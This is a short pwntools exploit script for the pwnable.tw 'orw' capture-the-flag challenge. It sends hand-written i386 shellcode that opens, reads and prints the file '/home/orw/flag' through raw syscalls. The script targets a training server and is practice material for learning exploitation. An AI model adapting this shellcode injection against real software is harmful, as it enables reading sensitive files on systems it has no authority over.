from pwn import *
from pwnlib import *

if __name__=='__main__':
    if args.args['REMOTE']:
        p = connect('chall.pwnable.tw', 10001)
    else:
        p = process('./orw')
    shellcode = """\
    /* push '/home/orw/flag\x00' */
    push 0x1010101
    xor dword ptr [esp], 0x1016660
    push 0x6c662f77
    push 0x726f2f65
    push 0x6d6f682f
    /* open(file='esp', oflag=0, mode='O_RDONLY') */
    mov ebx, esp
    xor ecx, ecx
    xor edx, edx
    /* call open() */
    push SYS_open /* 5 */
    pop eax
    int 0x80

        mov ebx, eax
        mov ecx, esp
        push 0x60
        pop edx
        /* read(fd='ebx', buf='ecx', nbytes='edx') */
        /* call read() */
        push SYS_read /* 3 */
        pop eax
        int 0x80

    mov eax, SYS_write
    mov ebx, 1
    mov ecx, esp
    mov edx, 0x60
    int 0x80
    """

    shellcode = asm.asm(shellcode, arch='i386', os='linux')
    print len(shellcode)
    p.send(shellcode)
    print p.recvall()
